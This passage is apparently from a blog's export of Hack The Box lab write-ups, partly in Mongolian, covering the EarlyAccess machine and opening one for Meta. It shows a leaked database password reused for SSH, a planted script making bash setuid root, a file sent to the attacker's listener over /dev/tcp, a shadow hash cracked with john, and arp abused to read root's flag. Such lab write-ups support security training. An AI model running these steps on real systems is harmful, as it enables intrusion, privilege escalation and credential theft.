--silent\u0026#34;],\u0026#34;Timeout\u0026#34;:2000000000},\u0026#34;Hostname\u0026#34;:\u0026#34;mysql\u0026#34;,\u0026#34;Image\u0026#34;:\u0026#34;mysql:latest\u0026#34;,\u0026#34;Labels\u0026#34;:{\u0026#34;com.docker.compose.config-hash\u0026#34;:\u0026#34;947cb358bc0bb20b87239b0dffe00fd463bd7e10355f6aac2ef1044d8a29e839\u0026#34;,\u0026#34;com.docker.compose.container-number\u0026#34;:\u0026#34;1\u0026#34;,\u0026#34;com.docker.compose.oneoff\u0026#34;:\u0026#34;False\u0026#34;,\u0026#34;com.docker.compose.project\u0026#34;:\u0026#34;app\u0026#34;,\u0026#34;com.docker.compose.project.config_files\u0026#34;:\u0026#34;docker-compose.yml\u0026#34;,\u0026#34;com.docker.compose.project.working_dir\u0026#34;:\u0026#34;/root/app\u0026#34;,\u0026#34;com.docker.compose.service\u0026#34;:\u0026#34;mysql\u0026#34;,\u0026#34;com.docker.compose.version\u0026#34;:\u0026#34;1.29.1\u0026#34;},\u0026#34;OnBuild\u0026#34;:null,\u0026#34;OpenStdin\u0026#34;:false,\u0026#34;StdinOnce\u0026#34;:false,\u0026#34;Tty\u0026#34;:true,\u0026#34;User\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;Volumes\u0026#34;:{\u0026#34;/docker-entrypoint-initdb.d\u0026#34;:{},\u0026#34;/var/lib/mysql\u0026#34;:{}},\u0026#34;WorkingDir\u0026#34;:\u0026#34;\u0026#34;},\u0026#34;Created\u0026#34;:\u0026#34;2022-01-07T08:12:13.704127504Z\u0026#34;,\u0026#34;Driver\u0026#34;:\u0026#34;overlay2\u0026#34;,\u0026#34;ExecIDs\u0026#34;:null,\u0026#34;GraphDriver\u0026#34;:{\u0026#34;Data\u0026#34;:{\u0026#34;LowerDir\u0026#34;:\u0026#34;/var/lib/docker/overlay2/ae979fa9158b6134ba08b7c587648c193d3fb8be2283dc5173a1e7403f0ff72a-init/diff:/var/lib/docker/overlay2/ecc064365b0367fc58ac796d9d5fe020d9453c68e2563f8f6d4682e38231083e/diff:/var/lib/docker/overlay2/4a21c5c296d0e6d06a3e44e3fa4817ab6f6f8c3612da6ba902dc28ffd749ec4d/diff:/var/lib/docker/overlay2/f0cdcc7bddc58609f75a98300c16282d8151ce18bd89c36be218c52468b3a643/diff:/var/lib/docker/overlay2/01e8af3c602aa396e4cb5af2ed211a6a3145337fa19b123f23e36b006d565fd0/diff:/var/lib/docker/overlay2/55b88ae64530676260fe91d4d3e6b0d763165505d3135a3495677cb10de74a66/diff:/var/lib/docker/overlay2/4064491ac251bcc0b677b0f76de7d5ecf0c17c7d64d7a18debe8b5a99e73e127/diff:/var/lib/docker/overlay2/a60c199d618b0f2001f106393236ba394d683a96003a4e35f58f8a7642dbad4f/diff:/var/lib/docker/overlay2/29b638dc55a69c49df41c3f2ec0f90cc584fac031378ae455ed1458a488ec48d/diff:/var/lib/docker/overlay2/ee59a9d7b93adc69453965d291e66c7d2b3e6402b2aef6e77d367da181b8912f/diff:/var/lib/docker/overlay2/4b5204c09ec7b0cbf22d409408529d79a6d6a472b3c4d40261aa8990ff7a2ea8/diff:/var/lib/docker/overlay2/8178a3527c2a805b3c2fe70e179797282bb426f3e73e8f4134bc2fa2f2c7aa22/diff:/var/lib/docker/overlay2/76b10989e43e43406fc4306e789802258e36323f7c2414e5e1242b6eab4bd3eb/diff\u0026#34;,\u0026#34;MergedDir\u0026#34;:\u0026#34;/var/lib/docker/overlay2/ae979fa9158b6134ba08b7c587648c193d3fb8be2283dc5173a1e7403f0ff72a/merged\u0026#34;,\u0026#34;UpperDir\u0026#34;:\u0026#34;/var/lib/docker/overlay2/ae979fa9158b6134ba08b7c587648c193d3fb8be2283dc5173a1e7403f0ff72a/diff\u0026#34;,\u0026#34;WorkDir\u0026#34;:\u0026#34;/var/lib/docker/overlay2/ae979fa9158b6134ba08b7c587648c193d3fb8be2283dc5173a1e7403f0ff72a/work\u0026#34;},\u0026#34;Name\u0026#34;:\u0026#34;overlay2\u0026#34;},\u0026#34;HostConfig\u0026#34;:{\u0026#34;AutoRemove\u0026#34;:false,\u0026#34;Binds\u0026#34;:[\u0026#34;/root/app/scripts/init.d:/docker-entrypoint-initdb.d:ro\u0026#34;,\u0026#34;app_vol_mysql:/var/lib/mysql:rw\u0026#34;],\u0026#34;BlkioDeviceReadBps\u0026#34;:null,\u0026#34;BlkioDeviceReadIOps\u0026#34;:null,\u0026#34;BlkioDeviceWriteBps\u0026#34;:null,\u0026#34;BlkioDeviceWriteIOps\u0026#34;:null,\u0026#34;BlkioWeight\u0026#34;:0,\u0026#34;BlkioWeightDevice\u0026#34;:null,\u0026#34;CapAdd\u0026#34;:[\u0026#34;SYS_NICE\u0026#34;],\u0026#34;CapDrop\u0026#34;:null,\u0026#34;Cgroup\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;CgroupParent\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;CgroupnsMode\u0026#34;:\u0026#34;host\u0026#34;,\u0026#34;ConsoleSize\u0026#34;:[0,0],\u0026#34;ContainerIDFile\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;CpuCount\u0026#34;:0,\u0026#34;CpuPercent\u0026#34;:0,\u0026#34;CpuPeriod\u0026#34;:0,\u0026#34;CpuQuota\u0026#34;:0,\u0026#34;CpuRealtimePeriod\u0026#34;:0,\u0026#34;CpuRealtimeRuntime\u0026#34;:0,\u0026#34;CpuShares\u0026#34;:0,\u0026#34;CpusetCpus\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;CpusetMems\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;DeviceCgroupRules\u0026#34;:null,\u0026#34;DeviceRequests\u0026#34;:null,\u0026#34;Devices\u0026#34;:null,\u0026#34;Dns\u0026#34;:null,\u0026#34;DnsOptions\u0026#34;:null,\u0026#34;DnsSearch\u0026#34;:null,\u0026#34;ExtraHosts\u0026#34;:null,\u0026#34;GroupAdd\u0026#34;:null,\u0026#34;IOMaximumBandwidth\u0026#34;:0,\u0026#34;IOMaximumIOps\u0026#34;:0,\u0026#34;IpcMode\u0026#34;:\u0026#34;private\u0026#34;,\u0026#34;Isolation\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;KernelMemory\u0026#34;:0,\u0026#34;KernelMemoryTCP\u0026#34;:0,\u0026#34;Links\u0026#34;:null,\u0026#34;LogConfig\u0026#34;:{\u0026#34;Config\u0026#34;:{},\u0026#34;Type\u0026#34;:\u0026#34;json-file\u0026#34;},\u0026#34;MaskedPaths\u0026#34;:[\u0026#34;/proc/asound\u0026#34;,\u0026#34;/proc/acpi\u0026#34;,\u0026#34;/proc/kcore\u0026#34;,\u0026#34;/proc/keys\u0026#34;,\u0026#34;/proc/latency_stats\u0026#34;,\u0026#34;/proc/timer_list\u0026#34;,\u0026#34;/proc/timer_stats\u0026#34;,\u0026#34;/proc/sched_debug\u0026#34;,\u0026#34;/proc/scsi\u0026#34;,\u0026#34;/sys/firmware\u0026#34;],\u0026#34;Memory\u0026#34;:0,\u0026#34;MemoryReservation\u0026#34;:0,\u0026#34;MemorySwap\u0026#34;:0,\u0026#34;MemorySwappiness\u0026#34;:null,\u0026#34;NanoCpus\u0026#34;:0,\u0026#34;NetworkMode\u0026#34;:\u0026#34;app_nw\u0026#34;,\u0026#34;OomKillDisable\u0026#34;:false,\u0026#34;OomScoreAdj\u0026#34;:0,\u0026#34;PidMode\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;PidsLimit\u0026#34;:null,\u0026#34;PortBindings\u0026#34;:{},\u0026#34;Privileged\u0026#34;:false,\u0026#34;PublishAllPorts\u0026#34;:false,\u0026#34;ReadonlyPaths\u0026#34;:[\u0026#34;/proc/bus\u0026#34;,\u0026#34;/proc/fs\u0026#34;,\u0026#34;/proc/irq\u0026#34;,\u0026#34;/proc/sys\u0026#34;,\u0026#34;/proc/sysrq-trigger\u0026#34;],\u0026#34;ReadonlyRootfs\u0026#34;:false,\u0026#34;RestartPolicy\u0026#34;:{\u0026#34;MaximumRetryCount\u0026#34;:0,\u0026#34;Name\u0026#34;:\u0026#34;always\u0026#34;},\u0026#34;Runtime\u0026#34;:\u0026#34;runc\u0026#34;,\u0026#34;SecurityOpt\u0026#34;:null,\u0026#34;ShmSize\u0026#34;:67108864,\u0026#34;UTSMode\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;Ulimits\u0026#34;:null,\u0026#34;UsernsMode\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;VolumeDriver\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;VolumesFrom\u0026#34;:[]},\u0026#34;HostnamePath\u0026#34;:\u0026#34;/var/lib/docker/containers/115007ba36acc375f807e9886c33bba6a00015de95d90ac9b035cfcc9c65731c/hostname\u0026#34;,\u0026#34;HostsPath\u0026#34;:\u0026#34;/var/lib/docker/containers/115007ba36acc375f807e9886c33bba6a00015de95d90ac9b035cfcc9c65731c/hosts\u0026#34;,\u0026#34;Id\u0026#34;:\u0026#34;115007ba36acc375f807e9886c33bba6a00015de95d90ac9b035cfcc9c65731c\u0026#34;,\u0026#34;Image\u0026#34;:\u0026#34;sha256:5c62e459e087e3bd3d963092b58e50ae2af881076b43c29e38e2b5db253e0287\u0026#34;,\u0026#34;LogPath\u0026#34;:\u0026#34;/var/lib/docker/containers/115007ba36acc375f807e9886c33bba6a00015de95d90ac9b035cfcc9c65731c/115007ba36acc375f807e9886c33bba6a00015de95d90ac9b035cfcc9c65731c-json.log\u0026#34;,\u0026#34;MountLabel\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;Mounts\u0026#34;:[{\u0026#34;Destination\u0026#34;:\u0026#34;/docker-entrypoint-initdb.d\u0026#34;,\u0026#34;Mode\u0026#34;:\u0026#34;ro\u0026#34;,\u0026#34;Propagation\u0026#34;:\u0026#34;rprivate\u0026#34;,\u0026#34;RW\u0026#34;:false,\u0026#34;Source\u0026#34;:\u0026#34;/root/app/scripts/init.d\u0026#34;,\u0026#34;Type\u0026#34;:\u0026#34;bind\u0026#34;},{\u0026#34;Destination\u0026#34;:\u0026#34;/var/lib/mysql\u0026#34;,\u0026#34;Driver\u0026#34;:\u0026#34;local\u0026#34;,\u0026#34;Mode\u0026#34;:\u0026#34;rw\u0026#34;,\u0026#34;Name\u0026#34;:\u0026#34;app_vol_mysql\u0026#34;,\u0026#34;Propagation\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;RW\u0026#34;:true,\u0026#34;Source\u0026#34;:\u0026#34;/var/lib/docker/volumes/app_vol_mysql/_data\u0026#34;,\u0026#34;Type\u0026#34;:\u0026#34;volume\u0026#34;}],\u0026#34;Name\u0026#34;:\u0026#34;/mysql\u0026#34;,\u0026#34;NetworkSettings\u0026#34;:{\u0026#34;Bridge\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;EndpointID\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;Gateway\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;GlobalIPv6Address\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;GlobalIPv6PrefixLen\u0026#34;:0,\u0026#34;HairpinMode\u0026#34;:false,\u0026#34;IPAddress\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;IPPrefixLen\u0026#34;:0,\u0026#34;IPv6Gateway\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;LinkLocalIPv6Address\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;LinkLocalIPv6PrefixLen\u0026#34;:0,\u0026#34;MacAddress\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;Networks\u0026#34;:{\u0026#34;app_nw\u0026#34;:{\u0026#34;Aliases\u0026#34;:[\u0026#34;mysql\u0026#34;,\u0026#34;115007ba36ac\u0026#34;],\u0026#34;DriverOpts\u0026#34;:null,\u0026#34;EndpointID\u0026#34;:\u0026#34;ea7202f4ce57070b1b29b7480f7d0bbad1f518029bebddcf7066c9339a4866d4\u0026#34;,\u0026#34;Gateway\u0026#34;:\u0026#34;172.18.0.1\u0026#34;,\u0026#34;GlobalIPv6Address\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;GlobalIPv6PrefixLen\u0026#34;:0,\u0026#34;IPAMConfig\u0026#34;:{\u0026#34;IPv4Address\u0026#34;:\u0026#34;172.18.0.100\u0026#34;},\u0026#34;IPAddress\u0026#34;:\u0026#34;172.18.0.100\u0026#34;,\u0026#34;IPPrefixLen\u0026#34;:16,\u0026#34;IPv6Gateway\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;Links\u0026#34;:null,\u0026#34;MacAddress\u0026#34;:\u0026#34;02:42:ac:12:00:64\u0026#34;,\u0026#34;NetworkID\u0026#34;:\u0026#34;21b7766aaedbf7acb2aa0cdd5edb3c1dcb0ff7bd1862f0bdeba42dd32f9a4099\u0026#34;}},\u0026#34;Ports\u0026#34;:{\u0026#34;3306/tcp\u0026#34;:null,\u0026#34;33060/tcp\u0026#34;:null},\u0026#34;SandboxID\u0026#34;:\u0026#34;56a717b402996134816fc6d7cb403815dd7b824bb884a38266673a9b2118fe23\u0026#34;,\u0026#34;SandboxKey\u0026#34;:\u0026#34;/var/run/docker/netns/56a717b40299\u0026#34;,\u0026#34;SecondaryIPAddresses\u0026#34;:null,\u0026#34;SecondaryIPv6Addresses\u0026#34;:null},\u0026#34;Path\u0026#34;:\u0026#34;docker-entrypoint.sh\u0026#34;,\u0026#34;Platform\u0026#34;:\u0026#34;linux\u0026#34;,\u0026#34;ProcessLabel\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;ResolvConfPath\u0026#34;:\u0026#34;/var/lib/docker/containers/115007ba36acc375f807e9886c33bba6a00015de95d90ac9b035cfcc9c65731c/resolv.conf\u0026#34;,\u0026#34;RestartCount\u0026#34;:0,\u0026#34;State\u0026#34;:{\u0026#34;Dead\u0026#34;:false,\u0026#34;Error\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;ExitCode\u0026#34;:0,\u0026#34;FinishedAt\u0026#34;:\u0026#34;0001-01-01T00:00:00Z\u0026#34;,\u0026#34;Health\u0026#34;:{\u0026#34;FailingStreak\u0026#34;:0,\u0026#34;Log\u0026#34;:[{\u0026#34;End\u0026#34;:\u0026#34;2022-01-09T13:28:34.216042885+01:00\u0026#34;,\u0026#34;ExitCode\u0026#34;:0,\u0026#34;Output\u0026#34;:\u0026#34;mysqladmin: [Warning] Using a password on the command line interface can be insecure.\\nmysqld is alive\\n\u0026#34;,\u0026#34;Start\u0026#34;:\u0026#34;2022-01-09T13:28:34.08894847+01:00\u0026#34;},{\u0026#34;End\u0026#34;:\u0026#34;2022-01-09T13:28:39.331741871+01:00\u0026#34;,\u0026#34;ExitCode\u0026#34;:0,\u0026#34;Output\u0026#34;:\u0026#34;mysqladmin: [Warning] Using a password on the command line interface can be insecure.\\nmysqld is alive\\n\u0026#34;,\u0026#34;Start\u0026#34;:\u0026#34;2022-01-09T13:28:39.220545254+01:00\u0026#34;},{\u0026#34;End\u0026#34;:\u0026#34;2022-01-09T13:28:44.454926842+01:00\u0026#34;,\u0026#34;ExitCode\u0026#34;:0,\u0026#34;Output\u0026#34;:\u0026#34;mysqladmin: [Warning] Using a password on the command line interface can be insecure.\\nmysqld is alive\\n\u0026#34;,\u0026#34;Start\u0026#34;:\u0026#34;2022-01-09T13:28:44.335553383+01:00\u0026#34;},{\u0026#34;End\u0026#34;:\u0026#34;2022-01-09T13:28:49.557133592+01:00\u0026#34;,\u0026#34;ExitCode\u0026#34;:0,\u0026#34;Output\u0026#34;:\u0026#34;mysqladmin: [Warning] Using a password on the command line interface can be insecure.\\nmysqld is alive\\n\u0026#34;,\u0026#34;Start\u0026#34;:\u0026#34;2022-01-09T13:28:49.459147552+01:00\u0026#34;},{\u0026#34;End\u0026#34;:\u0026#34;2022-01-09T13:28:54.665423536+01:00\u0026#34;,\u0026#34;ExitCode\u0026#34;:0,\u0026#34;Output\u0026#34;:\u0026#34;mysqladmin: [Warning] Using a password on the command line interface can be insecure.\\nmysqld is alive\\n\u0026#34;,\u0026#34;Start\u0026#34;:\u0026#34;2022-01-09T13:28:54.561773859+01:00\u0026#34;}],\u0026#34;Status\u0026#34;:\u0026#34;healthy\u0026#34;},\u0026#34;OOMKilled\u0026#34;:false,\u0026#34;Paused\u0026#34;:false,\u0026#34;Pid\u0026#34;:1075,\u0026#34;Restarting\u0026#34;:false,\u0026#34;Running\u0026#34;:true,\u0026#34;StartedAt\u0026#34;:\u0026#34;2022-01-07T08:12:16.00787012Z\u0026#34;,\u0026#34;Status\u0026#34;:\u0026#34;running\u0026#34;}},\u0026#34;status\u0026#34;:200} \u0026#34;Env\u0026#34;:[\u0026#34;MYSQL_DATABASE=db\u0026#34;,\u0026#34;MYSQL_USER=drew\u0026#34;,\u0026#34;MYSQL_PASSWORD=drew\u0026#34;,\u0026#34;MYSQL_ROOT_PASSWORD=XeoNu86JTznxMCQuGHrGutF3Csq5\u0026#34;, ssh drew@10.10.11.110 password: XeoNu86JTznxMCQuGHrGutF3Csq5 user.txt\n2d27000********* 5. Enumeration ssh drew@10.10.11.110 password: XeoNu86JTznxMCQuGHrGutF3Csq5 sudo -l:\ndrew@earlyaccess:~$ sudo -l -bash: sudo: command not found logs:\n[+] PATH [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses /usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games New path exported: /usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/sbin:/usr/sbin:/sbin /etc/passwd:\ncat: /etc/passwod: No such file or directory drew@earlyaccess:~$ cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:104:110::/nonexistent:/usr/sbin/nologin sshd:x:105:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin drew:x:1000:1000:drew:/home/drew:/bin/bash game-adm:x:1001:1001::/home/game-adm:/bin/bash [+] Networks and neighbours Kernel IP routing table Destination Gateway Genmask Flags Metric Ref Use Iface default 10.10.10.2 0.0.0.0 UG 0 0 0 ens160 10.10.10.0 0.0.0.0 255.255.254.0 U 0 0 0 ens160 172.17.0.0 0.0.0.0 255.255.0.0 U 0 0 0 docker0 172.18.0.0 0.0.0.0 255.255.0.0 U 0 0 0 br-21b7766aaedb 172.19.0.0 0.0.0.0 255.255.0.0 U 0 0 0 br-ffc3c4811c09 IP address HW type Flags HW address Mask Device 10.10.10.2 0x1 0x2 00:50:56:b9:09:33 * ens160 172.18.0.102 0x1 0x2 02:42:ac:12:00:66 * br-21b7766aaedb 172.19.0.4 0x1 0x2 02:42:ac:13:00:04 * br-ffc3c4811c09 172.18.0.2 0x1 0x2 02:42:ac:12:00:02 * br-21b7766aaedb [+] Checking if containerd(ctr) is available [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/containerd-ctr-privilege-escalation ctr was found in /usr/bin/ctr, you may be able to escalate privileges with it ctr: failed to dial \u0026#34;/run/containerd/containerd.sock\u0026#34;: connection error: desc = \u0026#34;transport: error while dialing: dial unix /run/containerd/containerd.sock: connect: permission denied\u0026#34; [+] Checking if runc is available [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/runc-privilege-escalation runc was found in /usr/bin/runc, you may be able to escalate privileges with it [+] Searching docker files [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-docker-socket srw-rw---- 1 root docker 0 Jan 7 09:12 /run/docker.sock [+] Modified interesting files in the last 5mins (limit 100) /var/log/lastlog /var/log/apache2/access-ssl.log /var/log/syslog /var/log/messages /var/log/daemon.log /var/log/user.log /var/log/auth.log /var/log/wtmp /home/drew/.gnupg/pubring.kbx /home/drew/.gnupg/crls.d/DIR.txt /home/drew/.gnupg/trustdb.gpg /opt/docker-entrypoint.d/node-server.sh [+] Mails (limit 50) 400314 4 -rw-r--r-- 1 root mail 678 Jul 14 12:26 /var/mail/drew 400314 4 -rw-r--r-- 1 root mail 678 Jul 14 12:26 /var/spool/mail/drew cat /var/mail/drew:\nTo: \u0026lt;drew@earlyaccess.htb\u0026gt; Subject: Game-server crash fixes From: game-adm \u0026lt;game-adm@earlyaccess.htb\u0026gt; Date: Thu May 27 8:10:34 2021 Hi Drew! Thanks again for taking the time to test this very early version of our newest project! We have received your feedback and implemented a healthcheck that will automatically restart the game-server if it has crashed (sorry for the current instability of the game! We are working on it...) If the game hangs now, the server will restart and be available again after about a minute. If you find any other problems, please don\u0026#39;t hesitate to report them! Thank you for your efforts! Game-adm (and the entire EarlyAccess Studios team). cat /var/spool/mail/drew:\nTo: \u0026lt;drew@earlyaccess.htb\u0026gt; Subject: Game-server crash fixes From: game-adm \u0026lt;game-adm@earlyaccess.htb\u0026gt; Date: Thu May 27 8:10:34 2021 Hi Drew! Thanks again for taking the time to test this very early version of our newest project! We have received your feedback and implemented a healthcheck that will automatically restart the game-server if it has crashed (sorry for the current instability of the game! We are working on it...) If the game hangs now, the server will restart and be available again after about a minute. If you find any other problems, please don\u0026#39;t hesitate to report them! Thank you for your efforts! Game-adm (and the entire EarlyAccess Studios team). id_rsa.pub:\nssh-rsa AAAAB3NzaC1yc****************************************************7nvettGYr5lcS8w== game-tester@game-server game-tester@game-server гэж байна.\nuname -a:\nLinux earlyaccess 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64 GNU/Linux Nmap binary: https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap\nLocal VM:\npython3 -m http.server Machine VM:\ncd /tmp curl 10.10.14.12:8000/nmap -o nmap chmod +x nmap ip addr | grep 172 inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0 inet 172.18.0.1/16 brd 172.18.255.255 scope global br-ca136e98e231 inet 172.19.0.1/16 brd 172.19.255.255 scope global br-681dd3ec01e5 ./nmap -oA output/ -n 172.19.0.1/24 Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-02-15 07:18 CET Unable to find nmap-services! Resorting to /etc/services Cannot find nmap-payloads. UDP payloads are disabled. Nmap scan report for 172.19.0.1 Host is up (0.00027s latency). Not shown: 1204 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 443/tcp open https Nmap scan report for 172.19.0.2 Host is up (0.00030s latency). All 1207 scanned ports on 172.19.0.2 are closed Nmap scan report for 172.19.0.3 Host is up (0.00032s latency). Not shown: 1206 closed ports PORT STATE SERVICE 22/tcp open ssh Nmap done: 256 IP addresses (3 hosts up) scanned in 3.03 seconds ssh game-tester@172.19.0.3 lntp:\nss -lntp State Recv-Q Send-Q Local Address:Port Peer Address:Port LISTEN 0 128 *:22 *:* LISTEN 0 128 127.0.0.11:33699 *:* LISTEN 0 128 *:9999 *:* LISTEN 0 128 :::22 :::* ~C prefix key, ssh-руу:\n-L 9999:172.19.0.3:9999 game-tester@game-server:/$ cat entrypoint.sh:\n#!/bin/bash for ep in /docker-entrypoint.d/*; do if [ -x \u0026#34;${ep}\u0026#34; ]; then echo \u0026#34;Running: ${ep}\u0026#34; \u0026#34;${ep}\u0026#34; \u0026amp; fi done tail -f /dev/null drew буцах: drew@earlyaccess:/opt/docker-entrypoint.d :\nvi exec.sh exec.sh\n#!/bin/bash chmod 4755 /bin/bash game-tester дээр орж ирэхгүй байгаа.\ndrew mv: loop:\nwhile true; do cp exec.sh /opt/docker-entrypoint.d/ done bash test.sh game-tester vm:\ngame-tester@game-server:~$ ls /docker-entrypoint.d/ │drew@earlyaccess:/tmp$ vi test.sh exec.sh node-server.sh │drew@earlyaccess:/tmp$ bash test.sh game-tester@game-server:~$ cat /docker-entrypoint.d/node-server.sh find . | grep server.js find . 2\u0026gt;/dev/null | grep server.js game-tester@game-server:/usr/src/app/server.js # Local VM nc -lvnp 9001 \u0026gt; out # Machine VM game-tester cat server.js \u0026gt; /dev/tcp/10.10.14.12/9001 өөрчлөх rounds=-1\nсервер унвал:\ngame-tester@game-server:~$ Connection to 172.19.0.3 closed by remote host. Connection to 172.19.0.3 closed. ./nmap -oA output/ -n 172.19.0.1/24 Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-02-15 08:13 CET Unable to find nmap-services! Resorting to /etc/services Cannot find nmap-payloads. UDP payloads are disabled. Nmap scan report for 172.19.0.1 Host is up (0.00026s latency). Not shown: 1204 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 443/tcp open https Nmap scan report for 172.19.0.2 Host is up (0.00029s latency). All 1207 scanned ports on 172.19.0.2 are closed Nmap scan report for 172.19.0.3 Host is up (0.00031s latency). Not shown: 1206 closed ports PORT STATE SERVICE 22/tcp open ssh 172.19.0.3 ssh game-tester@172.19.0.3 ``\ndrew@earlyaccess:/tmp$ ssh game-tester@172.19.0.3 Linux game-server 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Tue Feb 15 07:09:11 2022 from 172.19.0.1 -bash-4.4$ bash -p id uid=1001(game-tester) gid=1001(game-tester) euid=0(root) groups=1001(game-tester) cd /etc/ cat shadow game-adm:$6$zbRQg.JO7dBWcZ$DWEKGCPIilhzWjJ/N0WRp.FNArirqqzEMeHTaA8DAJjPdu8h52v0UZncJD8Df.0ncf6X2mjKYnH19RfGRneWX/:18822:0:99999:7::: vi hashes # hash нэмнэ $6$zbRQg.JO7dBWcZ$DWEKGCPIilhzWjJ/N0WRp.FNArirqqzEMeHTaA8DAJjPdu8h52v0UZncJD8Df.0ncf6X2mjKYnH19RfGRneWX/ # дараа нь: john hashes --wordlist=/usr/share/wordlists/rockyou.txt # result Warning: detected hash type \u0026#34;sha512crypt\u0026#34;, but the string is also recognized as \u0026#34;HMAC-SHA256\u0026#34; Use the \u0026#34;--format=HMAC-SHA256\u0026#34; option to force loading these as that type instead Warning: detected hash type \u0026#34;sha512crypt\u0026#34;, but the string is also recognized as \u0026#34;HMAC-SHA384\u0026#34; Use the \u0026#34;--format=HMAC-SHA384\u0026#34; option to force loading these as that type instead Using default input encoding: UTF-8 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x]) Cost 1 (iteration count) is 5000 for all loaded hashes Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status gamemaster (?) 1g 0:00:00:25 DONE (2022-02-15 02:20) 0.03913g/s 526.0p/s 526.0c/s 526.0C/s handball..waiting Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed gamemaster\nsu - game-adm # id uid=1001(game-adm) gid=1001(game-adm) groups=1001(game-adm),4(adm) # ./arp -an ? (172.19.0.4) at 02:42:ac:13:00:04 [ether] on br-af44398bdb65 ? (10.10.10.2) at 00:50:56:b9:64:63 [ether] on ens160 ? (172.18.0.2) at 02:42:ac:12:00:02 [ether] on br-2fa8dd3cbbb cd /usr/sbin /arp -v -f /root/root.txt # root.txt 7096b************* ","permalink":"https://cadil.github.io/posts/2024-02-27-htb-earlyaccess-writeup/","summary":"1. IP Address # Machine Address 10.10.11.110 # Local Address 10.10.14.12 2. Nmap CLI:\nnmap -sV -sC -oA nmap/early_access 10.10.11.110 Out:\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-02-01 02:20 EST Nmap scan report for 10.10.11.110 Host is up (0.24s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 e4:66:28:8e:d0:bd:f3:1d:f1:8d:44:e9:14:1d:9c:64 (RSA) | 256 b3:a8:f4:49:7a:03:79:d3:5a:13:94:24:9b:6a:d1:bd (ECDSA) |_ 256 e9:aa:ae:59:4a:37:49:a6:5a:2a:32:1d:79:26:ed:bb (ED25519) 80/tcp open http Apache httpd 2.","title":"HTB - EarlyAccess"},{"content":"1. IP Address # Machine Address 10.10.11.140 # Local Address 10.10.14.90 2. Nmap nmap -sC -sV -oA nmap/meta 10.10.11.140 Result:\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-01-30 04:32 EST Nmap scan report for 10.10.11.140 Host is up (0.24s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 